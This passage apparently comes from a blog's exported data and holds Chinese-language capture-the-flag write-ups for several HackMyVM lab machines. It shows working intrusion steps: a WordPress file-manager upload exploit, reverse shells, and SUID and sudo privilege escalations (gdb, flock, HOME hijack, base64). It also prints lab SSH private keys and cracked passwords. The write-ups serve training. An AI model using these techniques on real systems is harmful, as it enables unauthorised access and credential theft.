setuid(0); setgid(0); system(&quot;/bin/bash&quot;); &#125; else &#123; puts(&quot;\\nWRONG&quot;); &#125; return 0;&#125; 只要输入等于5880就会执行/bin/bash 1234bonita@MiWiFi-RA71-srv:~$ ./berootEnter the code: 5880root@MiWiFi-RA71-srv:~# 提权结束","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-VulnY","slug":"HackmyVM-VulnY","date":"2025-01-24T05:17:41.000Z","updated":"2025-04-19T13:25:36.799Z","comments":true,"path":"2025/01/24/HackmyVM-VulnY/","permalink":"https://lvzhouhang.xyz/2025/01/24/HackmyVM-VulnY/","excerpt":"","text":"信息搜集123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 a4:a9:30:df:ef:44 (Unknown)192.168.31.165 08:00:27:6c:16:9b PCS Systemtechnik GmbH192.168.31.187 a6:9b:e0:2d:30:9a (Unknown: locally administered)192.168.31.220 46:3e:62:f9:1e:fa (Unknown: locally administered)4 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 1.976 seconds (129.55 hosts/sec). 4 responded ip为192.168.31.165 ，nmap扫描端口 123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.165 --min-rate=1000 -p-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 00:19 ESTNmap scan report for vulny (192.168.31.165)Host is up (0.049s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE80/tcp open http33060/tcp open mysqlxMAC Address: 08:00:27:6C:16:9B (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 28.56 seconds 开了一个mysql服务和http的服务 80端口扫描目录能扫出来有一个secret的目录 123┌──(root㉿kali)-[~/Desktop/tmp]└─# curl http://192.168.31.165/secret/Neither &lt;b&gt;/etc/wordpress/config-192.168.31.165.php&lt;/b&gt; nor &lt;b&gt;/etc/wordpress/config-168.31.165.php&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username 提示了要去看/etc/wordpress/config-168.31.165.php，可以看出来这是一个wordpress的框架，wp-content存在目录遍历 在Index of /secret/wp-content/uploads/2020/10这里能发现一个压缩包wp-file-manager-6.O.zip，这个插件存在任意文件上传 1curl -F cmd=upload -F target=l1_ -F upload[]=@rev.php -XPOST &quot;http://192.168.31.165/secret/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot; 上传一个反弹shell的文件 访问http://192.168.31.165/secret/wp-content/plugins/wp-file-manager/lib/files/rev.php 进行反弹shell 12$ iduid=33(www-data) gid=33(www-data) groups=33(www-data) 提权cd进/etc/wordpress， 123www-data@vulny:/etc/wordpress$ lslsconfig-192.168.1.122.php htaccess 文件名和80端口的不一样，猜测可能是80端口是ip地址输出的文件名 12345678910www-data@vulny:/etc/wordpress$ cat c*cat c*&lt;?phpdefine(&#x27;DB_NAME&#x27;, &#x27;wordpress&#x27;);define(&#x27;DB_USER&#x27;, &#x27;wordpress&#x27;);define(&#x27;DB_PASSWORD&#x27;, &#x27;myfuckingpassword&#x27;);define(&#x27;DB_HOST&#x27;, &#x27;localhost&#x27;);define(&#x27;DB_COLLATE&#x27;, &#x27;utf8_general_ci&#x27;);define(&#x27;WP_CONTENT_DIR&#x27;, &#x27;/usr/share/wordpress/wp-content&#x27;);?&gt; 给了mysql的账号密码，这还有wordpress的路径，查看wp-config.php有一行注释很突出 1/* idrinksomewater */ 登录mysql，找不到有用的东西 查看/etc/passwd有一个adrian可以登录，注释就是密码 12345www-data@vulny:/usr/share/wordpress$ su adriansu adrianPassword: idrinksomewateradrian@vulny:/usr/share/wordpress$ 12345678adrian@vulny:/$ sudo -lsudo -lMatching Defaults entries for adrian on vulny: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser adrian may run the following commands on vulny: (ALL : ALL) NOPASSWD: /usr/bin/flock 123adrian@vulny:/$ sudo -u root /usr/bin/flock -u / /bin/bashsudo -u root /usr/bin/flock -u / /bin/bashroot@vulny:/ 提权成功","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Hommie","slug":"HackmyVM-Hommie","date":"2025-01-23T11:28:47.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/01/23/HackmyVM-Hommie/","permalink":"https://lvzhouhang.xyz/2025/01/23/HackmyVM-Hommie/","excerpt":"","text":"信息搜集12345678┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 a4:a9:30:df:ef:44 (Unknown)192.168.31.85 7e:2c:58:df:4e:cb (Unknown: locally administered)192.168.31.116 08:00:27:26:b1:6f PCS Systemtechnik GmbH192.168.31.220 46:3e:62:f9:1e:fa (Unknown: locally administered) ip为192.168.31.116，nmap扫描端口 12345678910111213┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.116 --min-rate=1000 -p-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 06:29 ESTNmap scan report for hommie (192.168.31.116)Host is up (0.00041s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE21/tcp open ftp22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:26:B1:6F (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds 80端口12345┌──(root㉿kali)-[~/Desktop/tmp]└─# curl 192.168.31.116alexia, Your id_rsa is exposed, please move it!!!!!Im fighting regarding reverse shells!-nobody 80端口目录也扫描不到，只给了一个提示，alexia的id_rsa泄露了，去看21端口 21端口12345678910111213141516171819202122232425262728293031┌──(root㉿kali)-[~/Desktop/tmp]└─# ftp anonymous@192.168.31.116Connected to 192.168.31.116.220 (vsFTPd 3.0.3)331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls229 Entering Extended Passive Mode (|||35772|)150 Here comes the directory listing.-rw-r--r-- 1 0 0 0 Sep 30 2020 index.html226 Directory send OK.ftp&gt; ls -al229 Entering Extended Passive Mode (|||35347|)150 Here comes the directory listing.drwxr-xr-x 3 0 113 4096 Sep 30 2020 .drwxr-xr-x 3 0 113 4096 Sep 30 2020 ..drwxrwxr-x 2 0 113 4096 Jan 23 06:12 .web-rw-r--r-- 1 0 0 0 Sep 30 2020 index.html226 Directory send OK.ftp&gt; cd .web250 Directory successfully changed.ftp&gt; ls229 Entering Extended Passive Mode (|||27864|)150 Here comes the directory listing.-rw-r--r-- 1 106 113 35 Jan 23 06:12 1.phtml-rw-r--r-- 1 0 0 99 Sep 30 2020 index.html-rw-r--r-- 1 106 113 5493 Jan 23 06:09 rev.php226 Directory send OK. 21端口有匿名登录，存在.web目录，可以往80端口传文件，但是不解析php，只能放弃 tftp扫描udp端口 123456789101112131415161718192021222324252627282930┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.116 --min-rate=1000 -sU --top-ports 20Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 06:34 ESTNmap scan report for hommie (192.168.31.116)Host is up (0.00053s latency).PORT STATE SERVICE53/udp closed domain67/udp open|filtered dhcps68/udp open|filtered dhcpc69/udp open|filtered tftp123/udp open|filtered ntp135/udp closed msrpc137/udp open|filtered netbios-ns138/udp open|filtered netbios-dgm139/udp open|filtered netbios-ssn161/udp closed snmp162/udp open|filtered snmptrap445/udp open|filtered microsoft-ds500/udp open|filtered isakmp514/udp closed syslog520/udp open|filtered route631/udp open|filtered ipp1434/udp open|filtered ms-sql-m1900/udp open|filtered upnp4500/udp open|filtered nat-t-ike49152/udp open|filtered unknownMAC Address: 08:00:27:26:B1:6F (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds tftp的服务开着，结合80端口给的提示 123┌──(root㉿kali)-[~/Desktop/tmp]└─# tftp 192.168.31.116tftp&gt; get id_rsa 可以下载下来alexia的id_rsa ssh登录 提权找有suid的命令 12345678910111213alexia@MiWiFi-RA71-srv:~$ find / -perm -u=s 2&gt;/dev/null/opt/showMetheKey/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/bin/gpasswd/usr/bin/chfn/usr/bin/su/usr/bin/mount/usr/bin/chsh/usr/bin/passwd/usr/bin/newgrp/usr/bin/umount /opt/showMetheKey很可疑啊,运行一下 12345678910111213141516171819202122232425262728alexia@MiWiFi-RA71-srv:~$ /opt/showMetheKey-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7V0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0yRn1XI+RqLi5NUHBPyiWEuQUEZCMOqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuOTgCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309jQMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBqkyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbIM2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjMdgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZWrH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0BtIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5Td/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/+suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiEUa47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjcOh8YBrgGGnZn1r0n1uHovBevMghlsgy/2wpmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvOpWuV7spnzPNAFUCjPTwgE2RpBVtkWeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBBO6ilulD8Xv1RBsVHUttE/Jzbu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNOhLCphB8agrhcke5+aq5z2nMdXUJ3DO60boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fyOmh14/i5ti7r9zHlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbsy6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMOnzUzkhrIen131h/MStsQYtYOZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZkOOtM08QPaLXRINjIKwVdmOk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gppivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfOWLaB13fGeV/wN0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==-----END OPENSSH PRIVATE KEY----- 把alexia的id_rsa输出了，将这个二进制文件拖下来放进ida看看 1234567int __fastcall main(int argc, const char **argv, const char **envp)&#123; setuid(0); setgid(0); system(&quot;cat $HOME/.ssh/id_rsa&quot;); return 0; 他是查看环境变量里HOME变量下的.ssh/id_rsa,可以修改HOME变量读取root的id_rsa 1234567alexia@MiWiFi-RA71-srv:~$ export HOME=/rootalexia@MiWiFi-RA71-srv:/home/alexia$ envSHELL=/bin/bashPWD=/home/alexiaLOGNAME=alexiaXDG_SESSION_TYPE=ttyHOME=/root 再次运行拿到root的id_rsa，登录即可","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Connection","slug":"HackmyVM-Connection","date":"2025-01-22T14:07:19.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/01/22/HackmyVM-Connection/","permalink":"https://lvzhouhang.xyz/2025/01/22/HackmyVM-Connection/","excerpt":"","text":"信息搜集123456789101112┌──(root㉿kali)-[~/Desktop/script]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 a4:a9:30:df:ef:44 (Unknown)192.168.31.77 08:00:27:2a:5f:aa PCS Systemtechnik GmbH192.168.31.220 46:3e:62:f9:1e:fa (Unknown: locally administered)192.168.31.187 a6:9b:e0:2d:30:9a (Unknown: locally administered)192.168.31.85 7e:2c:58:df:4e:cb (Unknown: locally administered)5 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 1.984 seconds (129.03 hosts/sec). 5 responded ip为192.168.31.77，nmap扫描端口 1234567891011121314┌──(root㉿kali)-[~/Desktop/script]└─# nmap 192.168.31.77 --min-rate=1000 -p-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 09:09 ESTNmap scan report for connection (192.168.31.77)Host is up (0.00064s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open http139/tcp open netbios-ssn445/tcp open microsoft-dsMAC Address: 08:00:27:2A:5F:AA (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 11.11 seconds 445端口开启了445端口 用enum4linux进行枚举 1234567891011121314151617181920212223242526 =================================( Share Enumeration on 192.168.31.77 )================================= Sharename Type Comment --------- ---- ------- share Disk print$ Disk Printer Drivers IPC$ IPC IPC Service (Private Share for uploading files)Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP CONNECTION[+] Attempting to map shares on 192.168.31.77//192.168.31.77/share Mapping: OK Listing: OK Writing: N/A//192.168.31.77/print$ Mapping: DENIED Listing: N/A Writing: N/A[E] Can&#x27;t understand response:NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\*//192.168.31.77/IPC$ Mapping: N/A Listing: N/A Writing: N/A smbclint可以匿名登陆share里有一个html，随便往里传一个文件发现在80端口访问到，传一个反弹shell的php文件 123456789┌──(root㉿kali)-[~/Desktop/script]└─# smbclient //192.168.31.77/sharePassword for [WORKGROUP\\root]:Anonymous login successfulsmb: \\&gt; cd html\\smb: \\html\\&gt;smb: \\html\\&gt; put rev.phpputting file rev.php as \\html\\rev.php (447.0 kb/s) (average 447.0 kb/s)smb: \\html\\&gt; exit 12345678910┌──(root㉿kali)-[~/Desktop/script]└─# nc -lvnp 5555listening on [any] 5555 ...connect to [192.168.31.129] from (UNKNOWN) [192.168.31.77] 45632Linux connection 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux 09:12:44 up 4 min, 0 users, load average: 0.00, 0.00, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#x27;t access tty; job control turned off$ 接收到shell了 提权用python获得一个更好的终端 12$ python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;www-data@connection:/$ 查找suid文件 1234567891011121314www-data@connection:/$ find / -perm -u=s 2&gt;/dev/nullfind / -perm -u=s 2&gt;/dev/null/usr/lib/eject/dmcrypt-get-device/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/bin/newgrp/usr/bin/umount/usr/bin/su/usr/bin/passwd/usr/bin/gdb/usr/bin/chsh/usr/bin/chfn/usr/bin/mount/usr/bin/gpassw 可以利用gdb进行suid提权 https://gtfobins.github.io/gtfobins/gdb/ 1234567891011121314151617181920www-data@connection:/$ gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit&lt;mport os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quitGNU gdb (Debian 8.2.1-2+b3) 8.2.1Copyright (C) 2018 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.Type &quot;show copying&quot; and &quot;show warranty&quot; for details.This GDB was configured as &quot;x86_64-linux-gnu&quot;.Type &quot;show configuration&quot; for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at: &lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type &quot;help&quot;.Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.# ididuid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data) 发现进到root组里了，提权结束","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-BaseME","slug":"HackmyVM-BaseME","date":"2025-01-22T13:12:15.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/01/22/HackmyVM-BaseME/","permalink":"https://lvzhouhang.xyz/2025/01/22/HackmyVM-BaseME/","excerpt":"","text":"信息搜集arp-scan -l 1234567891011┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 a4:a9:30:df:ef:44 (Unknown)192.168.31.85 7e:2c:58:df:4e:cb (Unknown: locally administered)192.168.31.220 46:3e:62:f9:1e:fa (Unknown: locally administered)192.168.31.232 08:00:27:d9:d3:0c PCS Systemtechnik GmbH4 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 1.973 seconds (129.75 hosts/sec). 4 responded ip为192.168.31.220，nmap扫描端口 123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.232 --min-rate=1000 -p-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 08:13 ESTNmap scan report for baseme (192.168.31.232)Host is up (0.0065s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:D9:D3:0C (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 21.46 seconds 80端口123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# curl 192.168.31.232QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK&lt;!--iloveyouyouloveyoushelovesyouhelovesyouweloveyoutheyhatesme--&gt; 给了一串base64和几个字符串 base64解码内容为： 123456┌──(root㉿kali)-[~/Desktop/tmp]└─# echo &quot;QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK&quot;|base64 -dALL, absolutely ALL that you need is in BASE64.Including the password that you need :)Remember, BASE64 has the answer to all your questions.-lucas 可以知道用户名为lucas，并且所有内容都要进行base64。 将字典进行base64编码，然后扫描目录 123456789101112131415161718192021222324┌──(root㉿kali)-[~/Desktop/tmp]└─# cat /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt|while read line;do for i in $line;echo $i|base64 &gt;&gt;1;done┌──(root㉿kali)-[~/Desktop/tmp]└─# gobuster dir -u &quot;http://192.168.31.232&quot; -w ./1===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.232[+] Method: GET[+] Threads: 10[+] Wordlist: ./1[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/aWRfcnNhCg== (Status: 200) [Size: 2537]/cm9ib3RzLnR4dAo= (Status: 200) [Size: 25]Progress: 4736 / 4737 (99.98%)===============================================================Finished=============================================================== 这两个文件分别是id_rsa和robots.txt 1234567┌──(root㉿kali)-[~/Desktop/tmp]└─# echo &quot;aWRfcnNhCg==&quot;|base64 -did_rsa┌──(root㉿kali)-[~/Desktop/tmp]└─# echo &quot;cm9ib3RzLnR4dAo=&quot;|base64 -drobots.txt robots.txt里什么也没有 12345678910111213141516171819202122232425262728293031323334┌──(root㉿kali)-[~/Desktop/tmp]└─# base64 cm9ib3RzLnR4dAo= -dNothing here :(┌──(root㉿kali)-[~/Desktop/tmp]└─# base64 aWRfcnNhCg=\\= -d-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YULBtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyvf7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5XYFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpKxkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbiNNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZzjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDIpxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJMJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mVtVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWhi6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xwN7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuMAif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQO+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rLND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJLdmmRXUS/DtO+69/aidvxGAYob+1M=-----END OPENSSH PRIVATE KEY----- 80端口给了几个字符串就是字典，base64编码后爆破id_rsa的密码 1234567891011121314151617┌──(root㉿kali)-[~/Desktop/tmp]└─# cat 1|while read line;do for i in $line;echo $i|base64 &gt;&gt;1;done┌──(root㉿kali)-[~/Desktop/tmp]└─# cat 1iloveyouyouloveyoushelovesyouhelovesyouweloveyoutheyhatesmeaWxvdmV5b3UKeW91bG92ZXlvdQo=c2hlbG92ZXN5b3UKaGVsb3Zlc3lvdQo=d2Vsb3ZleW91Cg==dGhleWhhdGVzbWUK 123456789101112131415161718┌──(root㉿kali)-[~/Desktop/tmp]└─# ssh2john id_rsa&gt;1┌──(root㉿kali)-[~/Desktop/tmp]└─# john 1 -w=1Using default input encoding: UTF-8Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])No password hashes left to crack (see FAQ)┌──(root㉿kali)-[~/Desktop/tmp]└─# john 1 -w=1 --showInvalid options combination: &quot;--show&quot;┌──(root㉿kali)-[~/Desktop/tmp]└─# john 1 --showid_rsa:aWxvdmV5b3UK1 password hash cracked, 0 left lucas用户的密码就是aWxvdmV5b3UK 提权ssh登录拿到user.txt sudo -l可以无密码运行base64，直接读取/root/root.txt 123456789101112131415161718192021222324lucas@MiWiFi-RA71-srv:~$ sudo -u root base64 /root/root.txt|base64 -dsudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname . ** * *. ,* *, , ,* ., *, / * ,* *, /. .*. * ** ,* ,* ** *. ** **. ,* ** *, ,* * ** *, .* *. ** ** ,*, ** *,HMVFKBS64 想提权到root的话需要读取id_rsa 1234567891011121314151617181920212223242526272829lucas@MiWiFi-RA71-srv:~$ sudo -u root base64 /root/.ssh/id_rsa|base64 -dsudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEAw6MgMnxUy+W9oem0Uhr2cJiez37qVubRK9D4kdu7H5NQ/Z0FFp2BIdV3wx9xDWAICJgtYQUvOV7KFNAWvEXTDdhBwdiUcWEJ4AOXK7+5v7x4b8vuG5zK0lTVxpDEBE8faPj3UaHsa1JUVaDngTIkCa6VBICvG0DCcfL8xHBpCSIfoHfpqmOpWT/pWXvGI3tk/Ku/STY7Ay8HtSgoqCcf3F+lb9J9kwKhFg9eLO5QDuFujb1CN7gUy8xhgNanUViyCZRwn7px+DfU+nscSEfG1zgfgqn2hCbBYqaP0jBgWcVL6YoMiwCS3jhmeFG4C/p51j3gI6b8yz9aS+DtdTpDwQAAA8D82/wZ/Nv8GQAAAAdzc2gtcnNhAAABAQDDoyAyfFTL5b2h6bRSGvZwmJ7PfupW5tEr0PiR27sfk1D9nQUWnYEh1XfDH3ENYAgImC1hBS85XsoU0Ba8RdMN2EHB2JRxYQngA5crv7m/vHhvy+4bnMrSVNXGkMQETx9o+PdRoexrUlRVoOeBMiQJrpUEgK8bQMJx8vzEcGkJIh+gd+mqY6lZP+lZe8Yje2T8q79JNjsDLwe1KCioJx/cX6Vv0n2TAqEWD14s7lAO4W6NvUI3uBTLzGGA1qdRWLIJlHCfunH4N9T6exxIR8bXOB+CqfaEJsFipo/SMGBZxUvpigyLAJLeOGZ4UbgL+nnWPeAjp